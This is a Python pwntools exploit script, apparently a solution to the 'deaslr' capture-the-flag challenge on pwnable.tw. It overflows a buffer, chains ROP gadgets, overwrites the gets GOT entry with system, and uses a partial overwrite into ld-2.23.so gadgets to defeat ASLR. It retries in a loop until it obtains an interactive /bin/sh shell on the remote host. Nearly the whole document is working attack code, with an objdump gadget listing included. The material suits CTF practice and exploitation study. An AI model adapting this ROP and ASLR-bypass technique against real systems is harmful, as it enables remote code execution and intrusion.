#!/usr/bin/env python3

from pwn import *

sla = lambda p, d, x: p.sendlineafter(d, x)
sa = lambda p, d, x: p.sendafter(d, x)
sl = lambda p, x: p.sendline(x)
s = lambda p, x: p.send(x)

slan = lambda p, d, n: p.sendlineafter(d, str(n).encode())
san = lambda p, d, n: p.sendafter(d, str(n).encode())
sln = lambda p, n: p.sendline(str(n).encode())
sn = lambda p, n: p.send(str(n).encode())

ru = lambda p, x: p.recvuntil(x)
rl = lambda p: p.recvline()
rn = lambda p, n: p.recvn(n)
rr = lambda p, t: p.recvrepeat(timeout=t)
ra = lambda p, t: p.recvall(timeout=t)
ia = lambda p: p.interactive()

lg = lambda t, addr: print(t, '->', hex(addr))
binsh = lambda libc: next(libc.search(b"/bin/sh\0"))
leak_bytes = lambda r, offset=0: u64(r.ljust(8, b"\0")) - offset
leak_hex = lambda r, offset=0: int(r, 16) - offset
leak_dec = lambda r, offset=0: int(r, 10) - offset
pad = lambda l, c: c * l
z = lambda l: l * b'\0'
A = lambda l: l * b'A'

exe = ELF("deaslr_patched", checksec=False)
libc = ELF("libc_64.so.6", checksec=False)
ld = ELF("./ld-2.23.so", checksec=False)

context.terminal = ["/mnt/c/Windows/system32/cmd.exe", "/c", "start", "wt.exe", "-w", "0", "split-pane", "-V", "-s", "0.5", "wsl.exe", "-d", "Ubuntu-24.04", "bash", "-c"]
context.binary = exe

gdbscript = '''
cd ''' + os.getcwd() + '''
set solib-search-path ''' + os.getcwd() + '''
set sysroot /
set follow-fork-mode parent
set detach-on-fork on
b *main+30
b *0x4005c8
continue
'''

def conn():
    if args.LOCAL:
        p = process(exe.path)
        sleep(0.1)
        return p
    else:
        host = "chall.pwnable.tw"
        port = 10402
        return remote(host, port)

'''
$ objdump -M intel -d --start-address=0x0 --stop-address=0x10000 ld-2.23.so > ld_gadgets

Search for register calls: "\bcall\s+r(?:ax|bx|cx|dx|si|di|sp|bp|8|9|1[0-5])\b"

    c352:	48 8b 43 10          	mov    rax,QWORD PTR [rbx+0x10]
    c356:	48 83 c3 18          	add    rbx,0x18
    c35a:	49 03 04 24          	add    rax,QWORD PTR [r12]
    c35e:	ff d0                	call   rax

    c7f0:	48 8b 43 10          	mov    rax,QWORD PTR [rbx+0x10]
    c7f4:	49 03 07             	add    rax,QWORD PTR [r15]
    c7f7:	ff d0                	call   rax

    c9f0:	48 8b 43 10          	mov    rax,QWORD PTR [rbx+0x10]
    c9f4:	49 03 04 24          	add    rax,QWORD PTR [r12]
    c9f8:	4c 89 9d 28 ff ff ff 	mov    QWORD PTR [rbp-0xd8],r11
    c9ff:	4c 89 95 30 ff ff ff 	mov    QWORD PTR [rbp-0xd0],r10
    ca06:	ff d0                	call   rax

    d0b0:	48 8b 43 10          	mov    rax,QWORD PTR [rbx+0x10]
    d0b4:	49 03 07             	add    rax,QWORD PTR [r15]
    d0b7:	ff d0                	call   rax

    d193:	48 8b 43 10          	mov    rax,QWORD PTR [rbx+0x10]
    d197:	49 03 04 24          	add    rax,QWORD PTR [r12]
    d19b:	4c 89 95 30 ff ff ff 	mov    QWORD PTR [rbp-0xd0],r10
    d1a2:	ff d0                	call   rax

    d31f:	48 8b 52 08          	mov    rdx,QWORD PTR [rdx+0x8]
    d323:	48 03 10             	add    rdx,QWORD PTR [rax]
    d326:	48 89 d0             	mov    rax,rdx
    d329:	ff d0                	call   rax

    d72f:	48 8b 52 08          	mov    rdx,QWORD PTR [rdx+0x8]
    d733:	48 03 10             	add    rdx,QWORD PTR [rax]
    d736:	48 89 d0             	mov    rax,rdx
    d739:	ff d0                	call   rax
'''

gets_to_system = libc.symbols['system'] - libc.symbols['gets']
pop_rbx_rbp_r12_r13_r14_r15_ret = 0x4005ba
pop_rdi_ret = 0x4005c3
offset_addr = exe.bss() + 8
binsh_addr = exe.bss()
nop_ret = 0x4005c8

attempt = 0
while True:
    attempt += 1
    print("\n----------> Attempt", attempt)

    p = conn()

    # Ubuntu 24.04
    if args.LOCAL:
        with open(f'/proc/{p.pid}/maps') as f:
            ld_lines = [line for line in f if 'ld-2.23.so' in line]
        print(ld_lines[0], end='')
        if int(ld_lines[0].split('-')[0], 16) % 0x1000000 == 0:
            if args.GDB:
                gdb.attach(p, gdbscript=gdbscript)
                sleep(1)
        else:
            p.close()
            continue

    pl = flat(
        A(0x18),

        pop_rdi_ret,
        binsh_addr,
        exe.plt['gets'],

        pop_rbx_rbp_r12_r13_r14_r15_ret,
        exe.got['gets'] - 0x10,
        0, 0, 0, 0,
        offset_addr,

        pop_rdi_ret,
        binsh_addr,

        p64(nop_ret) * 6,
    )

    if args.LOCAL:
        pl += p16(0xc7f0) # Ubuntu 24.04
    else:
        pl += p8(0xb0) # Ubuntu 16.04

    sl(p, pl)
    
    sleep(0.25)

    sl(p, flat(b'/bin/sh\0', gets_to_system))
    
    if args.GDB:
        input()
        
    try:
        sleep(0.5)
        sl(p, b'id')
        if p.recvuntil(b'id', timeout=0.5):
            print("Spawn shell:")
            rr(p, 0.5)
            ia(p)
        else:
            raise exception
    except:
        print("Failed attempt")
        p.close()
        continue

    p.close()
    break